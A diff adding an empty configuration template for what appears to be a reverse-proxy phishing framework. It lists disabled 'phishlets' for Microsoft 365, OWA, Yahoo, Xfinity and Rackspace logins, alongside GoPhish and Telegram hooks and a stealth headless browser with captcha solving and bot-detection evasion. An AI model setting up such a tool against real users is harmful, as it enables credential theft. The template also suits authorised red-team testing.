@@ -1,0 +1,124 @@
+{
+  "blacklist": {
+    "mode": ""
+  },
+  "certificates": {},
+  "general": {
+    "autocert": false,
+    "bind_ipv4": "",
+    "dns_port": 0,
+    "domain": "fake.com",
+    "external_ipv4": "",
+    "https_port": 0,
+    "ipv4": "",
+    "unauth_url": ""
+  },
+  "gophish": {
+    "admin_url": "",
+    "api_key": "",
+    "insecure": false
+  },
+  "lures": [],
+  "phishlets": {
+    "example": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "example-puppet": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "m365": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "office365": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "one": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "owa": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "rackspace": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "xfinity": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "yahoo-small": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    }
+  },
+  "proxy": {
+    "address": "190.94.345.334",
+    "enabled": false,
+    "password": "",
+    "port": 8080,
+    "type": "https",
+    "username": ""
+  },
+  "puppet": {
+    "browser": {
+      "args": [
+        "--no-sandbox",
+        "--disable-setuid-sandbox",
+        "--disable-dev-shm-usage",
+        "--disable-gpu",
+        "--disable-blink-features=AutomationControlled"
+      ],
+      "headless": true,
+      "max_retries": 3,
+      "proxy_address": "",
+      "proxy_enabled": false,
+      "proxy_password": "",
+      "proxy_port": 0,
+      "proxy_username": "",
+      "timeout": 60
+    },
+    "captcha_api_key": "",
+    "captcha_service": "2captcha",
+    "enabled": false,
+    "interceptors": [],
+    "stealth": {
+      "enabled": true,
+      "geolocation": "block",
+      "locale": "en-US",
+      "randomize_fingerprint": true,
+      "timezone": "America/New_York",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "viewport_height": 720,
+      "viewport_width": 1280
+    },
+    "triggers": []
+  },
+  "telegram": {
+    "chat_id": "",
+    "token": ""
+  }
+}
